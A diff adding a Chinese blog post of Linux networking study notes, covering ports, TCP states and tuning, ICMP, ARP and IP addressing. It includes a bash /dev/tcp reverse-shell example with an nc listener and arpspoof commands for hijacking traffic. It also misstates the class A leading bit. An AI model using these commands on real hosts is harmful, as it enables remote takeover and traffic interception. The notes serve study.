+<li>49152-65535：动态或私有端口，客户端随机使用端口，范围定义：&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_local_port_range</li>
+</ul>
+<p>&#x2F;etc&#x2F;services 这个文件记录了常用的服务对应的端口号</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment"># cat /etc/services | grep mysql</span>
+mysql           <span class="token number">3306</span>/tcp                        <span class="token comment"># MySQL</span>
+mysql           <span class="token number">3306</span>/udp                        <span class="token comment"># MySQL</span>
+mysql-cluster   <span class="token number">1186</span>/tcp                <span class="token comment"># MySQL Cluster Manager</span>
+mysql-cluster   <span class="token number">1186</span>/udp                <span class="token comment"># MySQL Cluster Manager</span>
+mysql-cm-agent  <span class="token number">1862</span>/tcp                <span class="token comment"># MySQL Cluster Manager Agent</span>
+mysql-cm-agent  <span class="token number">1862</span>/udp                <span class="token comment"># MySQL Cluster Manager Agent</span>
+mysql-im        <span class="token number">2273</span>/tcp                <span class="token comment"># MySQL Instance Manager</span>
+mysql-im        <span class="token number">2273</span>/udp                <span class="token comment"># MySQL Instance Manager</span>
+mysql-proxy     <span class="token number">6446</span>/tcp                <span class="token comment"># MySQL Proxy</span>
+mysql-proxy     <span class="token number">6446</span>/udp                <span class="token comment"># MySQL Proxy</span>
+mysqlx          <span class="token number">33060</span>/tcp               <span class="token comment"># MySQL Database Extended Interface</span></code></pre>
+
+<p>范例：找到端口冲突的应用程序</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ss命令查看套接字，找到冲突的端口号，l参数表示查看被占用（监听）的端口号</span>
+ss <span class="token parameter variable">-ntl</span>
+<span class="token comment">## p参数可以看到占用该端口的进程</span>
+ss <span class="token parameter variable">-ntlp</span>
+<span class="token comment">## 或者使用lsof能查看更详细的进程信息</span>
+<span class="token function">lsof</span> <span class="token parameter variable">-i</span> :port</code></pre>
+
+<p>范例：判断端口是否被占用，除了使用 ss，还以用以下方式</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># &lt; /dev/tcp/127.0.0.1/9501</span>
+<span class="token punctuation">[</span>root@4710419222 ~<span class="token punctuation">]</span><span class="token comment"># echo $?</span>
+<span class="token number">0</span></code></pre>
+
+<p>范例：反弹 shell 实现远程控制</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#在控制机监听打开端口</span>
+<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#dnf -y install nc</span>
+<span class="token punctuation">[</span>root@centos8 ~<span class="token punctuation">]</span><span class="token comment">#nc -lvp 6666</span>
+Ncat: Version <span class="token number">7.70</span> <span class="token punctuation">(</span> https://nmap.org/ncat <span class="token punctuation">)</span>
+Ncat: Listening on :::6666
+Ncat: Listening on <span class="token number">0.0</span>.0.0:6666
+<span class="token comment">#在被控制机上实现反弹shell</span>
+<span class="token punctuation">[</span>root@centos7 ~<span class="token punctuation">]</span><span class="token comment">#bash -i &amp;> /dev/tcp/10.0.0.8/6666 0>&amp;1</span>
+<span class="token comment">#在控制机主机可以观察到以下信息，自动登录到被控制主机，且可以执行命令</span></code></pre>
+
+<h3 id="TCP-三次握手"><a href="#TCP-三次握手" class="headerlink" title="TCP 三次握手"></a>TCP 三次握手</h3><p>以下 主动方 是 主动握手方，被动方 是 被动握手方</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1613529950598.png"></p>
+<p>再说一遍：SYN 是<strong>同步位</strong>，要求建立同步连接。ACK 是<strong>确认位</strong>，确保现在的连接是有效的（确保 seq、next seq、ack 等数据是有效的）</p>
+<p>第一次握手：主动方 —&gt; 被动方，SYN&#x3D;1，ACK&#x3D;0<br>第二次握手：被动方 —&gt; 主动方，SYN&#x3D;1，ACK&#x3D;1<br>第三次握手：主动方 —&gt; 被动方，SYN&#x3D;0，ACK&#x3D;1，之后的通信确保 ACK 位一直为 1</p>
+<h4 id="三次握手过程中-seq-和-ack"><a href="#三次握手过程中-seq-和-ack" class="headerlink" title="三次握手过程中 seq 和 ack"></a>三次握手过程中 seq 和 ack</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">seq</span>			<span class="token comment"># 我当前的位置</span>
+next <span class="token function">seq</span>	<span class="token comment"># 我下一步准备去的位置，注意：只有确认对方成功收到这条报文，才真的去这个位置，那如何确认呢？只要下一条返回的报文的ack等于next seq，就确认了</span>
+ack			<span class="token comment"># 确认对方位置，并希望对方下次从这个位置开始发送信息</span></code></pre>
+
+<ol>
+<li><p>第一次握手：主动方 —&gt; 被动方：<code>seq=0，next seq=1，ack=0</code><br><font color=red>我在 0（seq&#x3D;0），你收到这条消息我就去 1（next seq&#x3D;1），你在 0 吗（ack&#x3D;0）</font></p>
+</li>
+<li><p>第二次握手：被动方 —&gt; 主动方：<code>seq=0，next seq=1，ack=1</code><br><font color=red>我在 0（seq&#x3D;0），你收到这条消息我就去 1（next seq&#x3D;1），你在 1 吗（ack&#x3D;1）</font></p>
+</li>
+<li><p>第三次握手：主动方 —&gt; 被动方：<code>seq=1，next seq=1，ack=1</code><br><font color=red>我在 1（seq&#x3D;1），你收到这条消息我还在 1（next seq&#x3D;1），你在 1 吗（ack&#x3D;1）</font></p>
+</li>
+<li><p>服务端收到了，默默去了 1</p>
+</li>
+<li><p>之后进行数据传送</p>
+</li>
+</ol>
+<p>前 3 条报文互相没有发送任何数据，只是相互通知自己要去 1，同时确认对方也到 1</p>
+<h4 id="sync-半连接和-accept-全连接队列"><a href="#sync-半连接和-accept-全连接队列" class="headerlink" title="sync 半连接和 accept 全连接队列"></a>sync 半连接和 accept 全连接队列</h4><ul>
+<li><p>syns queue：第一次握手后，被动方把请求放到 syns queue（半连接队列、未完成连接队列），然后进入 SYN-RCVD 状态</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_syn_backlog   <span class="token comment">#半连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre>
+</li>
+<li><p>accept queue：最后一次握手后，从 syns queue 中拿出相关信息放到 accept queue(全连接队列、完成连接队列)，然后进入 ESTAB 状态</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/core/somaxconn    <span class="token comment">#全连接队列大小，默认值128,建议调整大小为1024以上</span></code></pre></li>
+</ul>
+<h4 id="三次握手过程中-TCP-状态"><a href="#三次握手过程中-TCP-状态" class="headerlink" title="三次握手过程中 TCP 状态"></a>三次握手过程中 TCP 状态</h4><p><strong>主动方：</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 三次握手之前的状态</span>
+SYN-SENT		<span class="token comment"># 发送SYN=1的请求建立连接的报文后的状态</span>
+ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>
+
+<p><strong>被动方：</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">CLOSED			<span class="token comment"># 服务器还没有建立监听状态，此时无法处理客户端发送的请求，也就是无法进行三次握手</span>
+LISTEN			<span class="token comment"># 建立监听状态，例如启动nginx后，才会监听80端口，此时才能处理http请求</span>
+SYN-RCVD		<span class="token comment"># 第二次握手和第三次握手的间隙</span>
+ESTAB-LISTEN	<span class="token comment"># 建立连接，开始传输数据，也可以只显示ESTAB</span></code></pre>
+
+<h3 id="TCP-四次挥手"><a href="#TCP-四次挥手" class="headerlink" title="TCP 四次挥手"></a>TCP 四次挥手</h3><p>以下 主动方 是主动挥手方，被动方 是 被动挥手方</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1613529829069.png"></p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1598322188545.png"></p>
+<ol>
+<li>主动方 —&gt; 被动方：ACK&#x3D;1，FIN&#x3D;1<br>FIN&#x3D;1 告诉服务器我要断开连接</li>
+<li>被动方 —&gt; 主动方：ACK&#x3D;1<br>收到消息，你稍等，我看看还有没有数据再给你</li>
+<li>被动方 —&gt; 主动方：ACK&#x3D;1，FIN&#x3D;1，PSH&#x3D;1<br>可能携带数据，也可能不携带，总之，你一次性取出来吧。这次你断开吧</li>
+<li>主动方 —&gt; 服务器：ACK&#x3D;1<br>OK，我断开了，拜拜</li>
+</ol>
+<p>注意：非正常的断开连接是不会有完整的四次挥手的</p>
+<p>四次挥手中 seq 和 ack 是如何变化的：相互通知对方自己的位置相较正常发送数据的情况下往前多走 1 位，并确认对方的位置</p>
+<h4 id="四次挥手过程中-TCP-状态"><a href="#四次挥手过程中-TCP-状态" class="headerlink" title="四次挥手过程中 TCP 状态"></a>四次挥手过程中 TCP 状态</h4><p><strong>主动方：</strong></p>
+<ul>
+<li><p>ESTAB-LISTEN：双方连接正常，也可以只显示 ESTAB</p>
+</li>
+<li><p>FIN-WAIT-1：主动方发送 FIN&#x3D;1 请求断开连接请求，到被动方回复 ACK&#x3D;1，确认收到请求的这段时间</p>
+</li>
+<li><p>FIN-WAIT-2：确认被动方收到分手请求，到被动方发送最后一次数据的这段等待时间。处于 FIN_WAIT_2 状态的主动方需要等待被动方发送结束报文段，才能转移至 TIME_WAIT 状态，否则它将一直停留在这个状态。连接长时间地停留在 FIN_WAIT_2，可能会未等服务器关闭连接就强行退出了，此时客户端连接由内核来接管，可称之为孤儿连接（和孤儿进程类似）。<br>Linux 为了防止孤儿连接长时间存留在内核中，定义了两个内核参数：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_max_orphans <span class="token comment">#指定内核能接管的孤儿连接数目</span>
+/proc/sys/net/ipv4/tcp_fin_timeout <span class="token comment">#指定孤儿连接在内核中生存的时间</span></code></pre>
+</li>
+<li><p>TIME-WAIT：主动方发送完最后一次挥手后，保持这个状态，确保 tcp 连接不断开，时间是 2MSL，确保被动方第三次挥手发送失败可以重发。</p>
+<ul>
+<li>每个报文段的生命周期是 1 个 MSL，一般是 30 秒</li>
+<li>只有主动方等待 2 个单位的 MSL，才能确保可以收到被动方的重传 FIN 报文</li>
+</ul>
+</li>
+<li><p>CLOSED：彻底断开连接，可以重新建立连接了</p>
+</li>
+</ul>
+<p>以上是理想情况，实际上主动方先发送一个 FIN 给被动方，自己进入 FIN_WAIT_1 状态，这时等待接收被动方报文，该报文会有三种可能：</p>
+<ul>
+<li><p>ACK：只收到被动方的 ACK，主动方会进入 FIN_WAIT_2 状态</p>
+</li>
+<li><p>FIN：只有被动方的 FIN 时，回应一个 ACK 给被动方，进入 CLOSING 状态，然后接收到被动方的 ACK 时，进入 TIME_WAIT 状态</p>
+</li>
+<li><p>ACK、FIN：同时收到被动方的 ACK 和 FIN，直接进入 TIME_WAIT 状态</p>
+</li>
+</ul>
+<p><strong>被动方：</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ESTAB-LISTEN	<span class="token comment"># 双方连接正常，也可以只显示ESTAB</span>
+CLOSE-WAIT		<span class="token comment"># 确认收到挥手请求，到发送最后一次数据传输中间的状态，即第二、三次挥手的中间状态</span>
+LAST-ACK		<span class="token comment"># 发送完最后一次数据传输，等待主动方最后的挥手，即第三、四次挥手的中间状态</span>
+CLOSED			<span class="token comment"># 彻底断开连接，可以重新建立连接了</span></code></pre>
+
+<h3 id="tcp-状态以及状态转换"><a href="#tcp-状态以及状态转换" class="headerlink" title="tcp 状态以及状态转换"></a>tcp 状态以及状态转换</h3><ol>
+<li>CLOSED：没有任何连接状态</li>
+<li>LISTEN：侦听状态，等待来自远方 TCP 端口的连接请求</li>
+<li>SYN-SENT：在发送连接请求后，等待对方确认</li>
+<li>SYN-RECEIVED：SYN-RCVD，在收到和发送一个连接请求后，等待对方确认</li>
+<li>ESTABLISHED：代表传输连接建立，双方进入数据传送状态</li>
+<li>FIN-WAIT-1：主动关闭，主机已发送关闭连接请求，等待对方确认</li>
+<li>FIN-WAIT-2：主动关闭,主机已收到对方关闭传输连接确认，等待对方发送关闭传输连接请求</li>
+<li>TIME-WAIT：完成双向传输连接关闭，等待所有分组消失</li>
+<li>CLOSE-WAIT：被动关闭,收到对方发来的关闭连接请求，并已确认</li>
+<li>LAST-ACK：被动关闭,等待最后一个关闭传输连接确认，并等待所有分组消失</li>
+<li>CLOSING：双方同时尝试关闭传输连接，等待对方确认</li>
+</ol>
+<h3 id="tcp-超时重传"><a href="#tcp-超时重传" class="headerlink" title="tcp 超时重传"></a>tcp 超时重传</h3><pre class="language-bash" data-language="bash"><code class="language-bash">/proc/sys/net/ipv4/tcp_retries1 <span class="token comment">#指定在底层IP接管之前TCP最少执行的重传次数，默认值是3</span>
+/proc/sys/net/ipv4/tcp_retries2 <span class="token comment">#指定连接放弃前TCP最多可以执行的重传次数，默认值15（一般对应13～30min）</span></code></pre>
+
+<h3 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h3><p>当前所使用的拥塞控制算法</p>
+<pre class="language-none"><code class="language-none">&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_congestion_control</code></pre>
+
+<h3 id="tcp-内核参数优化"><a href="#tcp-内核参数优化" class="headerlink" title="tcp 内核参数优化"></a>tcp 内核参数优化</h3><p>编辑文件&#x2F;etc&#x2F;sysctl.conf，加入以下内容：然后执行 sysctl -p 让参数生效。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 套接字由本端要求关闭，规定保持在FIN-WAIT-2状态的时间，默认值是60秒</span>
+net.ipv4.tcp_fin_timeout <span class="token operator">=</span> <span class="token number">2</span>
+
+<span class="token comment"># 提示：reuse和recycle这两个参数可以防止生产环境下Web、Squid等业务服务器time_wait网络状态数量过多</span>
+<span class="token comment"># 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认0</span>
+net.ipv4.tcp_tw_reuse <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token comment"># 开启TCP连接中TIME-WAIT sockets的快速回收，默认0</span>
+net.ipv4.tcp_tw_recycle <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token comment"># 开启SYN Cookies功能。当出现SYN等待队列溢出时，启用Cookies来处理，可防范少量SYN攻击</span>
+net.ipv4.tcp_syncookies <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token comment"># 当keepalive启用时，TCP发送keepalive消息的频率。单位秒</span>
+net.ipv4.tcp_keepalive_time <span class="token operator">=</span> <span class="token number">600</span>
+
+<span class="token comment"># 设定允许系统打开的端口范围，即用于向外连接的端口范围</span>
+net.ipv4.ip_local_port_range <span class="token operator">=</span> <span class="token number">2000</span> <span class="token number">65000</span>
+
+<span class="token comment"># SYN队列的长度，即半连接队列长度，默认为1024，建议加大队列的长度为8192或更多，这样可以容纳更多等待连接的网络连接数。 该参数为服务器端用于记录那些尚未收到客户端确认信息的连接请求最大值</span>
+net.ipv4.tcp_max_syn_backlog <span class="token operator">=</span> <span class="token number">16384</span>
+
+<span class="token comment"># 系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数值，TIME_WAIT套接字将立刻被清除并打印警告信息。 默认为180000，对于Apache、Nginx等服务器来说可以将其调低一点，如改为5000~30000，避免因过多的TIME_WAIT套接字使Web服务器变慢</span>
+net.ipv4.tcp_max_tw_buckets <span class="token operator">=</span> <span class="token number">36000</span>
+
+<span class="token comment"># 路由缓存刷新频率，当一个路由失败后多长时间跳到另一个路由，默认是300</span>
+net.ipv4.route.gc_timeout <span class="token operator">=</span> <span class="token number">100</span>
+
+<span class="token comment"># 内核放弃连接之前发送SYN+ACK包的数量，默认5</span>
+net.ipv4.tcp_syn_retries <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token comment"># 在内核放弃建立连接之前发送SYN包的数量，默认6</span>
+net.ipv4.tcp_synack_retries <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token comment"># 系统所能处理不属于任何进程的TCP sockets最大数量（主动关闭端发送了FIN后转到FIN_WAIT_1，这时TCP连接就不属于某个进程了）。假如超过这个数量，那么不属于任何进程的连接会被立即reset，并同时显示警告信息。之所以要设定这个限制，纯粹为了抵御那些简单的 DoS 攻击﹐千万不要依赖这个或是人为的降低这个限制，默认8192</span>
+net.ipv4.tcp_max_orphans <span class="token operator">=</span> <span class="token number">16384</span>
+
+<span class="token comment"># 同时发起的TCP的最大连接数，即全连接队列长度，在高并发请求中，可能会导致链接超时或重传，一般结合并发请求数来调大此值，默认128</span>
+net.core.somaxconn <span class="token operator">=</span> <span class="token number">16384</span>
+
+<span class="token comment"># 当每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许发送到队列的数据包最大数，默认1000</span>
+net.core.netdev_max_backlog <span class="token operator">=</span> <span class="token number">16384</span></code></pre>
+
+<p>以上参数在 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4 路径下</p>
+<h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><p>udp 包头结构</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1598341151668.png"></p>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jingmoxukong/p/3811262.html">ICMP</a></h3><p>ICMP 报文在 IP 报文内部：</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1600676241594.png"></p>
+<p><strong>icmp 包头结构：</strong></p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1600938679478.png"><br><img data-src="//img.to2b.cn/blog/ljk/1600938925363.png"></p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1613533292143.png"></p>
+<ul>
+<li>类型：一个 8 位类型字段，表示 ICMP 数据包类型</li>
+<li>代码：一个 8 位代码域，表示指定类型中的一个功能。如果一个类型中只有一种功能，代码域置为 0</li>
+<li>校验和：校验整个 ICMP 报文段，提供额外的可靠性</li>
+</ul>
+<p>ICMP 协议是为了辅助 IP 协议而被制造出来，ICMP 分担完善了 IP 的一部分功能。<br>ICMP 的功能分为两类：<strong>差错通知</strong> 和 <strong>信息查询</strong>，具体由 8 位的类型字段决定，以下是具体各种功能：</p>
+<h4 id="目的不可达（Destination-Unreachable）"><a href="#目的不可达（Destination-Unreachable）" class="headerlink" title="目的不可达（Destination Unreachable）"></a>目的不可达（Destination Unreachable）</h4><p>type：destination-unreachable，3</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">15</span>
+
+<span class="token comment"># 0：目标网络不可达</span>
+<span class="token comment"># 1：目标主机不可达</span>
+<span class="token comment"># 2：目标协议不可达</span>
+<span class="token comment"># 3：目标端口不可达</span>
+<span class="token comment"># ...</span></code></pre>
+
+<h4 id="超时（Time-Exceeded）"><a href="#超时（Time-Exceeded）" class="headerlink" title="超时（Time Exceeded）"></a>超时（Time Exceeded）</h4><p>type：time-exceeded，11</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1
+
+<span class="token comment"># 0：在数据报传输期间生存时间TTL为0；传输过程中超时</span>
+<span class="token comment"># 1：在数据报组装期间生存时间TTL为0；一个IP数据报可能会因为过大而被分片，然后在目的主机侧把所有的分片重组。如果主机迟迟没有等到所有的分片报文，就会向源发送方发送一个ICMP超时报文，Code为1，表示分片重组超时了</span></code></pre>
+
+<h4 id="参数错误报文（Parameter-Problem）"><a href="#参数错误报文（Parameter-Problem）" class="headerlink" title="参数错误报文（Parameter Problem）"></a>参数错误报文（Parameter Problem）</h4><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
+<p>| Type | Code | Checksum |</p>
+<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
+<p>| Pointer | unused |</p>
+<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
+<p>| Internet Header + 64 bits of Original Data Datagram |</p>
+<p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p>
+<p>type：parameter-problem，12</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">code：0、1
+
+<span class="token comment"># 0：IP数据报头的参数错误，Pointer表示错误的字节位置</span>
+<span class="token comment"># 1：缺少必需的选项</span></code></pre>
+
+<h4 id="源冷却（Source-Quench）"><a href="#源冷却（Source-Quench）" class="headerlink" title="源冷却（Source Quench）"></a>源冷却（Source Quench）</h4><p>type：source-quench，4</p>
+<p>code：0，路由器在处理报文时会有一个缓存队列。如果超过最大缓存队列，将无法处理，从而丢弃报文。并向源发送方发一个 ICMP 源冷却报文，告诉对方：“嘿，我这里客满了，你迟点再来。”</p>
+<h4 id="重定向（Redirect）"><a href="#重定向（Redirect）" class="headerlink" title="重定向（Redirect）"></a>重定向（Redirect）</h4><p>type：redirect，5</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">3</span>
+
+<span class="token comment"># 0：网络重定向</span>
+<span class="token comment"># 1：主机重定向</span>
+<span class="token comment"># 2：服务类型和网络重定向</span>
+<span class="token comment"># 3：服务类型和主机重定向</span></code></pre>
+
+<h4 id="请求回显或回显应答（Echo-or-Echo-Reply）"><a href="#请求回显或回显应答（Echo-or-Echo-Reply）" class="headerlink" title="请求回显或回显应答（Echo or Echo Reply）"></a>请求回显或回显应答（Echo or Echo Reply）</h4><p>type：echo-request，8，请求回显，ping 请求；</p>
+<pre><code>code：0，因为只有这一个功能，所以code只为0
+</code></pre>
+<p>type：echo-reply，0，回显应答，ping 应答；</p>
+<pre><code>code：0，因为只有这一个功能，所以code只为0
+</code></pre>
+<h4 id="时间戳或时间戳请求（Timestamp-or-Timestamp-Reply）"><a href="#时间戳或时间戳请求（Timestamp-or-Timestamp-Reply）" class="headerlink" title="时间戳或时间戳请求（Timestamp or Timestamp Reply）"></a>时间戳或时间戳请求（Timestamp or Timestamp Reply）</h4><h4 id="信息请求或信息响应（Info-Request-or-Info-Reply）"><a href="#信息请求或信息响应（Info-Request-or-Info-Reply）" class="headerlink" title="信息请求或信息响应（Info Request or Info Reply）"></a>信息请求或信息响应（Info Request or Info Reply）</h4><h4 id="地址掩码请求-和-地址掩码响应（Address-Mask-Request-or-Address-Mask-Reply）"><a href="#地址掩码请求-和-地址掩码响应（Address-Mask-Request-or-Address-Mask-Reply）" class="headerlink" title="地址掩码请求 和 地址掩码响应（Address Mask Request or Address Mask Reply）"></a>地址掩码请求 和 地址掩码响应（Address Mask Request or Address Mask Reply）</h4><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>ARP（Address Resolution Protocol）即地址解析协议， 用于实现从 IP 地址到 MAC 地址的映射，即询问目标 IP 对应的 MAC 地址。</p>
+<p>ARP 的工作过程：</p>
+<p>通过广播可以获取目标 ip 的 MAC 地址，拿到地址后，源主机和目标主机会缓存对方的 ip 和 MAC 地址。</p>
+<p><img data-src="//img.to2b.cn/blog/ljk/1598355062997.png"></p>
+<p>显然这种方式是不安全的，例如 pc1 想上网，上网得通过路由器，那就得拿到路由器的 MAC 地址，于是 pc1 就发送广播请求路由器的 MAC 地址，同一个局域网下 pc2 冒充路由器把自己的 MAC 地址回复给 pc1，如果 pc1 不做校验就信以为真，那之后 pc1 所有的网路请求都找 pc2，pc2 帮它转发到真正的路由器。</p>
+<p>范例：kali 系统实现 arp 欺骗上网流量劫持</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#启动路由转发功能</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># echo 1 > /proc/sys/net/ipv4/ip_forward</span>
+<span class="token comment">#安装包</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># apt-get install dsniff</span>
+<span class="token comment">#欺骗目标主机，本机是网关</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 被劫持的目标主机IP 网关IP</span>
+<span class="token comment">#欺骗网关，本机是目标主机</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 网关IP 被劫持的目标主机IP</span></code></pre>
+
+<h4 id="Gratuitous-ARP"><a href="#Gratuitous-ARP" class="headerlink" title="Gratuitous ARP"></a>Gratuitous ARP</h4><p>Gratuitous ARP 也称为免费 ARP，无故 ARP。Gratuitous ARP 不同于一般的 ARP 请求，它并非期待得到 ip 对应的 mac 地址，而是当主机启动的时候，将发送一个 Gratuitous arp 请求，即请求自己的 ip 地址的 mac 地址。具体表现形式为自问自答。Wireshark 监听 vmware 虚拟机启动可以抓到相应的包。</p>
+<h3 id="RARP"><a href="#RARP" class="headerlink" title="RARP"></a>RARP</h3><p>ARP 是将 ip 转成 MAC，RARP 是将 MAC 转成 ip。在网吧中会用到，网吧中的电脑是没有硬盘的，操作系统、软件、数据等都放在服务器中，每次开机都先通过网卡把初始化的操作系统下载下来放到内存中，再从内存中加载。加载的过程中使用 RARP 获取 ip，过程如下：</p>
+<ol>
+<li>pc 将自己的 mac 发给服务器</li>
+<li>服务器中预设了 arp 表，查询表，将对应的 ip 发给 pc</li>
+</ol>
+<h3 id="IP-包头"><a href="#IP-包头" class="headerlink" title="IP 包头"></a>IP 包头</h3><img data-src="//img.to2b.cn/blog/ljk/1598357957585.png" style="zoom:80%;" />
+
+<p><img data-src="//img.to2b.cn/blog/ljk/1598361685849.png"></p>
+<ul>
+<li>版本：目前主流是 4 版本</li>
+<li>首部长度：固定的 20 个字节+可选字段的长度</li>
+<li>区分服务：服务类型，ToS，Type of Service，只有当网络设备能够识别 ToS 时，ToS 字段才有意义，我的笔记本上 Wireshark 抓包就没有这个字段</li>
+<li>总长度：总长度，包括数据部分</li>
+<li>标识：数据比较大，传输层会分段后再发给网络层，分段后的数据标识都是一样的。同时还是计数器，每发送一个报文，该值+1</li>
+<li>标志：占 3 位,目前只有后两位有意义<ul>
+<li>DF： Don’t Fragment 中间的一位，只有当 DF&#x3D;0 时才允许分片</li>
+<li>MF： More Fragment 最后一位，MF&#x3D;1 表示后面还有分片,MF&#x3D;0 表示最后一个分片 IP PDU 报头</li>
+</ul>
+</li>
+<li>片漂移：该分片在原分组中的相对位置.片偏移以 8 个字节为偏移单位</li>
+<li>生存时间：记为 TTL (Time To Live) 报文在网络中可通过的路由器数的最大值，TTL 字段是由发送端初始设置一个 8 bit 字段。Linux 默认 64，windows 默认 128<ul>
+<li>在<code>/proc/sys/net/ipv4/ip_default_ttl </code>中可以改</li>
+</ul>
+</li>
+<li>协议：指定上层协议的类型，1 表示为 ICMP 协议, 2 表示为 IGMP 协议, 6 表示为 TCP 协议, 17 表示为 UDP 协议</li>
+<li>首部校验和：tcp 的包头也有这个校验，这是有点重复，所以在 ipv6 中就没有这个字段了</li>
+<li>源地址和目的地址：都各占 4 字节,分别记录源地址和目的逻辑地址，也就是 ip 地址</li>
+</ul>
+<h2 id="主机到主机的包传递完整过程"><a href="#主机到主机的包传递完整过程" class="headerlink" title="主机到主机的包传递完整过程"></a>主机到主机的包传递完整过程</h2><p>第 12 天第五节课</p>
+<p>四步走：路由（下面讲）、arp、三次握手、数据传输</p>
+<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>ip 地址是逻辑地址，MAC 地址是物理地址。物理地址唯一但不好管理，逻辑地址唯一且好管理。</p>
+<h3 id="IP-地址组成"><a href="#IP-地址组成" class="headerlink" title="IP 地址组成"></a>IP 地址组成</h3><p>两部分组成：网络 ID 和 主机 ID</p>
+<p>类似 10.0.0.1 这种用点分割成 4 段的是 ipv4 的 ip，可以用一个 32 位二进制的数来表示，每段对应 8 位。</p>
+<h3 id="IP-地址分类"><a href="#IP-地址分类" class="headerlink" title="IP 地址分类"></a>IP 地址分类</h3><p>五类，A 类、B 类、C 类、D 类、E 类。E 类保留，D 类不能配置，所以我们能配置的是 A、B、C 三类。</p>
+<ul>
+<li>A 类：网络 ID 位是最高 8 位，主机 ID 是 24 位低位。规定最高位是 1，所以 A 类只剩下 2^7（128）个网段（网络），也就是 0-127，但是 0 保留不能用，表示未知地址，127 用于回环网卡，所以 ipv4 中处于 A 类网络的一共有 126 个网段，<strong>1.x.x.x-126.x.x.x</strong>。所以 10.x.x.x、126.x.x.x 这种一看就是 A 类，而 172.x.x.x 这种大于 126，一看就不是 A 类网络</li>
+<li>B 类：网络 ID 位是最高 16 位,主机 ID 是 16 位低位。规定最高两位是 10，所有 B 类网络有 2^14 个网段，<strong>128.0.x.x-191.255.x.x</strong>。</li>
+<li>C 类：网络 ID 位是最高 24 位,主机 ID 是 8 位低位。规定前三位是 110，所以 C 类网络中有 2^21 个网段，<strong>192.0.0.x-223.255.255.x</strong>。</li>
+<li>D 类：组播、多播。224-239</li>
+<li>E 类：保留未使用，240-255</li>
+</ul>
+<p>这么分类简单粗暴，缺点也很明显，容易浪费，现在 ipv4 地址已经消耗殆尽了。</p>
+<p>分配 ipv4 的权利在美国手里，早期甚至直接给一个大学分配一个网段，这个网段的地址其他人就申请不到了，其实根本用不了，用不了的就浪费掉了。</p>
+<h4 id="无类"><a href="#无类" class="headerlink" title="无类"></a>无类</h4><p>就是不按照 ABCD 的方式划分，网络 ID 想划几位就几位，按需划分，不固定非得是 8 位、16 位、24 位等等</p>
